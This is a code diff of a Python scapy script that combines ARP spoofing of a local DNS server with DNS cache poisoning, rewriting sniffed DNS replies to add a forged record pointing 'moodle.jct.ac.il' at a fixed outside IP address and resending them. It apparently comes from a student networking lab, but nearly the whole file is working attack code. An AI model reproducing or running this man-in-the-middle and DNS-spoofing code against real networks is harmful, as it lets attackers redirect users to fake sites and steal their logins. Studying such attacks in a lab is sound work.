@@ -1,44 +1,48 @@
 from scapy.all import *
-import arpSpoof
 import threading
 import time
+from uuid import getnode
+from arpSpoof import attack_ip
 
 DNS_IP='192.168.43.186'
 DELAY=1
 FAKE_IP='54.229.142.49'
 
 
-def generate_response( pkt, fake_ip ):
-    #not in use
-   ptype='A'
+def generate_response( pck):
 
-   resp = IP(dst=pkt[IP].src, id=pkt[IP].id)\
-      /UDP(dport=pkt[UDP].sport, sport=53)\
-      /DNS( id=pkt[DNS].id,
-            aa=1, #we are authoritative
-            qr=1, #it's a response
-            rd=pkt[DNS].rd, # copy recursion-desired
-            qdcount=pkt[DNS].qdcount, # copy question-count
-            qd=pkt[DNS].qd, # copy question itself
-            ancount=1, #we provide a single answer
-            an=DNSRR(rrname='moodle.jct.ac.il', type=ptype, ttl=100, rdata=fake_ip )
-      )
-   return resp
+    resp = IP(dst=pck[IP].src, id=pck[IP].id)\
+           /UDP(dport=pck[UDP].sport, sport=53)\
+           /DNS()
+    resp[DNS]=pck[DNS]
+    return resp
 
 def arpspoofing_adapter():
-    arpSpoof.attack_ip(DNS_IP, DELAY)
+    attack_ip(DNS_IP, DELAY)
 
 
-def edit_response(pck):
-    pck[DNS].ancount+=1
-    pck[DNS].an.add_payload(rrname='moodle.jct.ac.il', type='A', ttl=100, rdata=FAKE_IP )
+def edit_response(pcks):
+    for pck in pcks:
+
+        pck[Ether].dst='08:00:27:1e:5c:b0'
+
+        pck[IP].dst='192.168.43.186'
+        try:
+            pck[DNS].arcount+=1
+            pck[DNS].ar.add_payload(DNSRR(rrname='moodle.jct.ac.il', type='A', ttl=1000, rdata=FAKE_IP ))
+        except Exception as e:
+            pass
+        print(pck.show())
+
+        send(generate_response(pck), loop=0,count=2)
 
 def dns_poisoning():
-    sniff(prn=edit_response,filter='udp src port 53 and host '+DNS_IP,count=3)
+    sniff(prn=edit_response,filter='udp src port 53 and host '+DNS_IP,store=3,count=12)
 
 
 
 def main():
+    print ('hello')
     #open two threads, one for arpspoofing and another for dns poisoning
     t = threading.Thread(name='arps', target=arpspoofing_adapter)
     s=threading.Thread(name='sniffer', target=dns_poisoning)
@@ -48,6 +52,7 @@ def main():
     s.start()
 
     s.join()
-
-
+    
 #    sniff(prn=send_response,filter=is_dns_query)
+if __name__=='__main__':
+    main()
